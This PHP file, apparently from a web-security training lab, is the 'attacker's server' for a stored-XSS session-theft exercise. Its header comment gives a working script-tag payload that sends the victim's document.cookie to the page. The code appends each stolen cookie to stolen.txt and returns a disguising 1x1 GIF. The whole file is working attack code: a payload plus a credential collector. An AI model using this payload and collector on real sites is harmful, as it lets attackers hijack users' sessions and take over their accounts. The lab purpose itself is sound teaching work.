<?php
/**
 * sniffer.php — helper for the stored-XSS session-theft exercise
 * ============================================================================
 * This is the "attacker's server" for the lab (runs on the same host for
 * convenience). A planted XSS payload can load this page and dump the
 * victim's cookies into stolen.txt:
 *
 *   <script>new Image().src='sniffer.php?c='+document.cookie</script>
 *
 * After the victim views a page that echoes their (stored) username, check:
 *   bank-app/stolen.txt
 */
$cookie = $_GET['c'] ?? '';
if ($cookie !== '') {
    file_put_contents(__DIR__ . '/stolen.txt', date('c') . "  " . $cookie . "\n", FILE_APPEND);
}
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'); // 1x1 gif
